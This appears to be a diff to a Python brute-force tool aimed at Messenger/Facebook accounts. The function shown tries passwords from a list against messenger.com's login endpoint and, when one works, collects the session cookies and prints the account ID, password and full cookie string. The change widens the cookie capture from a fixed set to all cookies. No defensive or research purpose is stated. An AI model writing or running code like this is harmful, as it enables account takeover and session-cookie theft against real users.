@@ -1412,7 +1412,7 @@ def rndm5(uid,passlist):
                         session.post(f'https://www.messenger.com/login/password/',data=data,headers=headers).text
                         log_cookies=session.cookies.get_dict().keys()
                         if 'some_key' in log_cookies:
-                                        coki=";".join([f"{key}={session.cookies.get(key)}" for key in ['sb', 'datr', 'ps_n', 'ps_l', 'locale', 'c_user', 'xs', 'fr', 'usida', 'wd', 'm_ls', 'presence']])
+                                        coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                                         cid = re.findall('c_user=(.*);xs', coki)[0]
                                         print(f'\r\r{G}[{G}BITHIKA-OK{G}]{G} '+cid+f' | '+pas+'\033[1;97m')
                                         print(f"\r\r{G}[{G}COOKIE{G}]>{R} "+coki)
